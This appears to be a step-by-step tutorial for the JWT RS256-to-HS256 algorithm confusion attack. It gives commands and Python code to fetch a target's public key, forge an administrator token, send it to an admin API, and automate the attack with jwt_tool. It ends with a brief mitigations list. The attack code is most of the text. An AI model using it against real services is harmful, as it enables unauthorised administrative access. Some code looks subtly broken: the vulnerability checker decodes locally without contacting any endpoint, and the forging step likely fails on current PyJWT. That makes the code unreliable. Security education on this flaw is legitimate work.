# JWT Algorithm Confusion: Forging Tokens by Flipping RS256 to HS256

When a server uses **RS256** (asymmetric), it signs with the private key and verifies with the **public** key. If the library accepts an `alg` header from the client without enforcing it server-side, you can flip `alg` to **HS256** and sign with the **public key as the HMAC secret** — which you already have.

## Why It Works

```
RS256: sign(data, PRIVATE_KEY)   verify(data, PUBLIC_KEY)
HS256: sign(data, SECRET)        verify(data, SECRET)

If verify() uses whatever alg= says:
  → you sign HS256 with PUBLIC_KEY as the secret
  → server verifies HS256 with its PUBLIC_KEY (same bytes)
  → signature check passes ✓
```

## Step 1: Grab the Server's Public Key

```bash
# JWKS endpoint (most common)
curl -s https://target.com/.well-known/jwks.json | jq .

# Or extract from an existing valid token
jwt_tool <valid_token> -T            # jwt_tool auto-fetches JWKS
# Or decode header/payload manually:
echo "<base64_header>" | base64 -d | jq .
```

## Step 2: Convert JWK to PEM (if needed)

```python
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from jwt.algorithms import RSAAlgorithm
import json, requests

jwks = requests.get("https://target.com/.well-known/jwks.json").json()
key_data = json.dumps(jwks["keys"][0])
public_key = RSAAlgorithm.from_jwk(key_data)
pem = public_key.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
print(pem.decode())   # -----BEGIN PUBLIC KEY-----...
```

## Step 3: Forge the Token

```python
import jwt  # PyJWT >= 2.x

# Load the public key PEM as raw bytes (this becomes our HMAC secret)
with open("public_key.pem", "rb") as f:
    pubkey_bytes = f.read()

payload = {
    "sub": "admin",
    "role": "administrator",
    "iat": 1748390400,
    "exp": 1748476800,
}

# Sign with HS256 using the public key as the HMAC secret
forged = jwt.encode(payload, pubkey_bytes, algorithm="HS256")
print(forged)
```

## Step 4: Send the Forged Token

```bash
curl -H "Authorization: Bearer <forged_token>" \
     https://target.com/api/admin/users
```

## Quick One-Liner with jwt_tool

```bash
# jwt_tool can automate the entire confusion attack
python3 jwt_tool.py <valid_token> -X k -pk public_key.pem
# -X k = key confusion attack
# Outputs a ready-to-use forged token
```

## Is the Target Vulnerable?

```python
import jwt

def check_confusion(token: str, pubkey_pem: bytes) -> bool:
    """Returns True if the endpoint accepts HS256 signed with the public key."""
    try:
        decoded = jwt.decode(token, pubkey_pem, algorithms=["HS256"])
        return True
    except jwt.exceptions.InvalidSignatureError:
        return False
    except Exception:
        return False
```

## Mitigations

- **Enforce `alg` server-side** — never trust the header's `alg` claim
- Pin the expected algorithm in your verification call: `jwt.decode(token, key, algorithms=["RS256"])`
- Use libraries that reject `alg: none` and don't accept symmetric keys for asymmetric algorithms (e.g. `python-jose` with strict mode, or `PyJWT >= 2.4`)

> Works against many Node.js/Java JWT libs that call `verify(token, publicKey)` without specifying `algorithms`. Still common in older Express apps and Spring Boot services.
